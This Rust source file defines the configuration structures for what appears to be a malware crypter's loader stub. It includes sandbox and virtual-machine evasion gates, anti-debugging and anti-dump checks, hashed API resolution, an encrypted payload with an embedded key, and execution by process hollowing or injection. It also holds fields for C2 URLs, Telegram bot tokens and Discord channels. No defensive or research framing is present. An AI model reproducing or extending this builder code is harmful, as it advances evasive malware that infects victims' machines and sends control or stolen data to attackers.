//! IR for the per-build stub.

use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct StubProgram {
    pub seed: [u8; 32],
    pub build_id: String,
    pub profile: String,
    pub gates: Vec<Gate>,
    pub debug_check: DebugCheck,
    pub resolver: Resolver,
    pub decrypt: DecryptScheme,
    pub virtualization: bool,
    pub integrity: IntegrityCheck,
    pub execution: ExecutionMethod,
    pub key_material: KeyMaterial,
    pub payload_blob: Vec<u8>,
    pub target_os: TargetOs,
    pub config_xor_key: [u8; 32],
    pub anti_dump: bool,
    pub anti_emulation: bool,
    pub junk_density: f32,
    pub discord: String,
    pub telegram_token: String,
    pub telegram_chat: String,
    pub c2_url: String,
    pub c2_auth: String,
    pub directive_json: String,

    /// Argon2id-derived AES-256 key. Baked into the stub as a const.
    /// The crypter derives it from salt+seed; the stub reads it directly.
    pub payload_key: [u8; 32],
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum Gate {
    UptimeMin(u64),
    CursorMotion { samples: u8 },
    RamMinMb(u32),
    CpuCoresMin(u8),
    UsernameBlocklist,
    HostnameBlocklist,
    DomainJoined,
    SleepJitter { min_ms: u32, max_ms: u32 },
    SleepAccelerationCheck { sleep_ms: u64, min_ratio: f32 },
    ApiHammerCheck,
    VirtualizationArtifacts,
    HypervisorCpuid,
    ParentDebugger,
    SnapshotCheck,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum DebugCheck {
    IsDebuggerPresent,
    PEBBeingDebugged,
    NtGlobalFlag,
    NtQueryInformationProcess,
    TimingCheck { rounds: u8 },
    None,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum Resolver {
    ExportWalkFnv1a,
    ExportWalkCrc32,
    ExportWalkDjb2,
    PebWalk,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum DecryptScheme {
    AesGcm,
    ChaCha20Poly1305,
    AesCbcHmac,
    XorDerived,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum IntegrityCheck {
    TextSectionHash,
    RegionCrc { start: u32, len: u32 },
    None,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum ExecutionMethod {
    ImageMap,
    ShellcodeInvoke,
    ProcessHollow { host: String },
    SpawnInject { host: String },
    DirectJump,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct KeyMaterial {
    pub salt: Vec<u8>,
    pub nonce: Vec<u8>,
    pub bind_to_fingerprint: bool,
    pub bind_to_code_hash: bool,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum TargetOs {
    Windows,
    Linux,
    Macos,
}
